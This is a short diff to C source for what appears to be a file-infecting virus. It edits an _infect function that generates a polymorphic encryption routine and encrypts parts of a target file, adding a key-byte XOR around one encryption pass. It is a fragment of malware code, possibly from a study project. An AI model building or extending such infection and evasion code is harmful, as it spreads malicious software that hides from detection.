@@ -120,8 +120,10 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	poly_generate(&p.encrypt_routine, &route);
 	//---------- z2 (encryption without compression) -------------
 	compressed = FALSE;
+	((unsigned char*)key)[0] ^= 0b01110010;
 	if (encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed, p.encrypt_routine) == -1)
 		return FALSE;
+	((unsigned char*)key)[0] ^= 0b01110010;
 	//---------- z3 (encryption with compression) ----------------
 	compressed = TRUE;
 	int64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed, p.encrypt_routine);
